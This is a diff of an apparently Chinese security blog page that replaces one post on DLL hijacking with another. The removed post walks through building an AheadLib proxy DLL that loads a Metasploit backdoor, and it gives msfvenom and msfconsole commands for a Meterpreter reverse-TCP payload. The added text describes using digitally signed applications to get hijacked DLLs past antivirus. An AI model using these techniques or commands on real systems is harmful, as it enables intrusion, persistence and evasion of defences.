@@ -16,31 +16,22 @@
   <meta name="author" content="Glacier">
   <meta name="keywords" content="">
   
-    <meta name="description" content="dll劫持与AheadLib最近在看msf配置信息的时候，看到生成dll文件，突然就想到了dll劫持，于是准备来折腾一下">
+    <meta name="description" content="DLL劫持可以用作权限维持，权限提升等作用，下面介绍一下在有杀毒软件的情况下dll劫持通过白加黑的方式获取权限，上线目标。杀软在检测一个应用是否为病毒的时候，首先会通过黑白名单校验-病毒特征库查询-上传云查杀，在黑白名单校验阶段，如果是白名单中的应用则可以成功运行，白名单也就是有数字签名的应用，我们可以通过修改有数字签名应用中的dll，当该应用启动时会调用该dll，从而上线目标">
 <meta property="og:type" content="article">
-<meta property="og:title" content="dll劫持与AheadLib">
-<meta property="og:url" content="https://glacierrrr.online/2022/08/18/dll%E5%8A%AB%E6%8C%81%E4%B8%8EAheadLib/index.html">
+<meta property="og:title" content="dll劫持_白加黑">
+<meta property="og:url" content="https://glacierrrr.online/2022/08/18/dll%E5%8A%AB%E6%8C%81_%E7%99%BD%E5%8A%A0%E9%BB%91/index.html">
 <meta property="og:site_name" content="Glacier&#39;s Blog">
-<meta property="og:description" content="dll劫持与AheadLib最近在看msf配置信息的时候，看到生成dll文件，突然就想到了dll劫持，于是准备来折腾一下">
+<meta property="og:description" content="DLL劫持可以用作权限维持，权限提升等作用，下面介绍一下在有杀毒软件的情况下dll劫持通过白加黑的方式获取权限，上线目标。杀软在检测一个应用是否为病毒的时候，首先会通过黑白名单校验-病毒特征库查询-上传云查杀，在黑白名单校验阶段，如果是白名单中的应用则可以成功运行，白名单也就是有数字签名的应用，我们可以通过修改有数字签名应用中的dll，当该应用启动时会调用该dll，从而上线目标">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://s2.loli.net/2022/08/18/kgBDKU17lNzXWQa.png">
-<meta property="og:image" content="https://s2.loli.net/2022/08/18/wp5fkSX9FNlmr2L.png">
-<meta property="og:image" content="https://s2.loli.net/2022/08/18/BAQiGUXbHg3z8wC.png">
-<meta property="og:image" content="https://s2.loli.net/2022/08/18/1JIjvcpbeUgOWFq.png">
-<meta property="og:image" content="https://s2.loli.net/2022/08/18/zank6NWHustC2cR.png">
-<meta property="og:image" content="https://s2.loli.net/2022/08/18/1ka4ZxJv6BO32WD.png">
-<meta property="og:image" content="https://s2.loli.net/2022/08/18/Qrme8qxodRO3NGs.png">
-<meta property="og:image" content="https://s2.loli.net/2022/08/18/ylZoMNxTp2Pfire.png">
 <meta property="article:published_time" content="2022-08-18T09:49:24.000Z">
-<meta property="article:modified_time" content="2022-10-18T06:16:07.017Z">
+<meta property="article:modified_time" content="2022-12-19T06:47:27.560Z">
 <meta property="article:author" content="Glacier">
 <meta property="article:tag" content="dll劫持">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://s2.loli.net/2022/08/18/kgBDKU17lNzXWQa.png">
   
   
   
-  <title>dll劫持与AheadLib - Glacier&#39;s Blog</title>
+  <title>dll劫持_白加黑 - Glacier&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -205,7 +196,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="dll劫持与AheadLib"></span>
+            <span id="subtitle" data-typed-text="dll劫持_白加黑"></span>
           
         </div>
 
@@ -228,7 +219,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.6k 字
+          190 字
         
       </span>
     
@@ -239,7 +230,7 @@
         
         
         
-          14 分钟
+          2 分钟
         
       </span>
     
@@ -277,51 +268,13 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">dll劫持与AheadLib</h1>
+            <h1 style="display: none">dll劫持_白加黑</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="dll劫持与AheadLib"><a href="#dll劫持与AheadLib" class="headerlink" title="dll劫持与AheadLib"></a>dll劫持与AheadLib</h1><p>最近在看msf配置信息的时候，看到生成dll文件，突然就想到了dll劫持，于是准备来折腾一下</p>
+                <p>DLL劫持可以用作权限维持，权限提升等作用，下面介绍一下在有杀毒软件的情况下dll劫持通过白加黑的方式获取权限，上线目标。<br>杀软在检测一个应用是否为病毒的时候，首先会通过黑白名单校验-病毒特征库查询-上传云查杀，在黑白名单校验阶段，如果是白名单中的应用则可以成功运行，白名单也就是有数字签名的应用，我们可以通过修改有数字签名应用中的dll，当该应用启动时会调用该dll，从而上线目标</p>
 <a id="more"></a>
-
-<h2 id="dll劫持"><a href="#dll劫持" class="headerlink" title="dll劫持"></a>dll劫持</h2><p>dll文件是计算机上的一类文件，提供给使用者一些开箱即用的变量、函数或类。库文件分为静态库和动态库，静态库和动态库的区别体现在程序的链接阶段：静态库在程序的链接阶段被复制到了程序中；动态库在链接阶段没有被复制到程序中，而是程序在运行时由系统动态加载到内存中供程序调用。使用动态库系统只需载入一次，不同的程序可以得到内存中相同的动态库的副本，因此节省了很多内存，而且使用动态库也便于模块化更新程序</p>
-<p>dll劫持是当一个可执行文件运行时，Windows加载器将可执行模块映射到进程的地址空间中，加载器分析可执行模块的输入表，并设法找出任何需要的DLL，并将它们映射到进程的地址空间</p>
-<blockquote>
-<p>简单来说，dll的存在就是方便程序来直接调用，避免将相同的内容重复多遍，以此来节省内存<br>而dll劫持，由下面一个例子说明</p>
-</blockquote>
-<p>一个可执行文件运行时，需要调用<code>test.dll</code>文件，但此时我们可以生成一个恶意的<code>test.dll</code>文件，并让他调用我们由msf生成的<code>shell.dll</code>或者其他后门，再调用原来的<code>test.dll</code>文件</p>
-<p><img src="https://s2.loli.net/2022/08/18/kgBDKU17lNzXWQa.png" srcset="/img/loading.gif" lazyload alt="图解dll劫持"></p>
-<p>如果dll劫持成功了，那原本的可执行文件仍将正常使用，但我们的后门也将成功执行，即msf上线</p>
-<h2 id="AheadLib"><a href="#AheadLib" class="headerlink" title="AheadLib"></a>AheadLib</h2><p>这里推荐一个用来生成dll转发的工具<a target="_blank" rel="noopener" href="https://github.com/Yonsm/AheadLib">AheadLib</a></p>
-<p>我们随便找一个dll文件来测试一下</p>
-<p><img src="https://s2.loli.net/2022/08/18/wp5fkSX9FNlmr2L.png" srcset="/img/loading.gif" lazyload></p>
-<p>我们把它生成的代码复制下来，用VisualStudio创建一个dll动态链接项目，但在这里，可能会出现比较多的问题<br>我这里使用的是ViusalStudio 2019 不同的版本可能会出现的问题不同</p>
-<p>首先项目提示我没有引入头文件，于是我加上了<code>#include &quot;pch.h&quot;</code><br>紧接着出现了如下的报错</p>
-<p><img src="https://s2.loli.net/2022/08/18/BAQiGUXbHg3z8wC.png" srcset="/img/loading.gif" lazyload></p>
-<p>解决方法是，在<code>项目-&gt;属性-&gt;高级-&gt;字符集</code> 改为使用多字节字符集</p>
-<p><img src="https://s2.loli.net/2022/08/18/1JIjvcpbeUgOWFq.png" srcset="/img/loading.gif" lazyload></p>
-<p>其他版本的可能存在不同的报错，可以尝试如下方法</p>
-<ol>
-<li>将运行库改为多线程(/MT)<br><img src="https://s2.loli.net/2022/08/18/zank6NWHustC2cR.png" srcset="/img/loading.gif" lazyload></li>
-<li>将预编译头改为不使用<br><img src="https://s2.loli.net/2022/08/18/1ka4ZxJv6BO32WD.png" srcset="/img/loading.gif" lazyload></li>
-</ol>
-<p>确认应用之后就只会有一个报错，我们不用管它，在Release x86的模式下，成功生成dll文件<br>成功处理好报错信息后，我们实现了由<code>test(evil).dll -&gt; test(org).dll</code><br>接下来实现<code>test(evil).dll-&gt;shell.dll</code><br>我们在AheadLib工具生成的cpp文件中，找到<code>DLLMain</code>函数，并加上我们需要调用的后门<code>shell.dll</code></p>
-<p><img src="https://s2.loli.net/2022/08/18/Qrme8qxodRO3NGs.png" srcset="/img/loading.gif" lazyload></p>
-<p>成功编译后，将生成的dll文件改为与原dll相同的名字，即<code>test.dll</code>，将原本的test.dll改为<code>testorg.dll</code><br>这样我们就完成了dll劫持，当运行可执行文件时，将会先调用我们改写的<code>test.dll</code></p>
-<p>最后，msf成功上线</p>
-<p><img src="https://s2.loli.net/2022/08/18/ylZoMNxTp2Pfire.png" srcset="/img/loading.gif" lazyload></p>
-<hr>
-<h2 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h2><p>最近浅浅的看了下sh文件的写法，于是就想到了写一些msf的sh文件，避免了每次使用msfconsole的复杂配置与msfvenum生成的复杂参数</p>
-<blockquote>
-<p>msfvenum的生成</p>
-</blockquote>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sh">ip=192.168.31.208<br>port=4444<br>arch=x86<br>platform=windows<br>format=exe<br>payload=windows/meterpreter/reverse_tcp<br><span class="hljs-comment">#use exploit/muilt/handler</span><br>out=../meter_re_tcp_x86.exe<br><br>msfvenom -p <span class="hljs-variable">$payload</span> LHOST=<span class="hljs-variable">$ip</span> LPORT=<span class="hljs-variable">$port</span> -f <span class="hljs-variable">$format</span> -a <span class="hljs-variable">$arch</span> --platform <span class="hljs-variable">$platform</span> -o <span class="hljs-variable">$out</span><br></code></pre></td></tr></table></figure>
-<blockquote>
-<p>msfconsole的监听</p>
-</blockquote>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">use exploit/multi/handler<br><span class="hljs-built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> LHOST 192.168.31.208<br><span class="hljs-built_in">set</span> LPORT 4444<br>run<br></code></pre></td></tr></table></figure>
-
                 
               </div>
             
@@ -339,7 +292,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/%E6%B8%97%E9%80%8F/" class="category-chain-item">渗透</a>
+  <a href="/categories/%E5%85%8D%E6%9D%80/" class="category-chain-item">免杀</a>
   
   
 
@@ -366,8 +319,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>dll劫持与AheadLib</div>
-      <div>https://glacierrrr.online/2022/08/18/dll劫持与AheadLib/</div>
+      <div>dll劫持_白加黑</div>
+      <div>https://glacierrrr.online/2022/08/18/dll劫持_白加黑/</div>
     </div>
     <div class="license-meta">
       
@@ -411,9 +364,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/09/11/PHP%E5%85%8D%E6%9D%80/" title="PHP免杀">
+                      <a href="/2022/08/18/dll%E5%8A%AB%E6%8C%81%E4%B8%8EAheadLib/" title="dll劫持与AheadLib">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">PHP免杀</span>
+                        <span class="hidden-mobile">dll劫持与AheadLib</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -421,8 +374,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/08/18/dll%E5%8A%AB%E6%8C%81_%E7%99%BD%E5%8A%A0%E9%BB%91/" title="dll劫持_白加黑">
-                        <span class="hidden-mobile">dll劫持_白加黑</span>
+                      <a href="/2022/08/16/CS%E7%94%9F%E6%88%90hta%E5%88%86%E6%9E%90%E4%B8%8Epowershell%E5%85%8D%E6%9D%80/" title="CS生成hta分析与powershell免杀">
+                        <span class="hidden-mobile">CS生成hta分析与powershell免杀</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
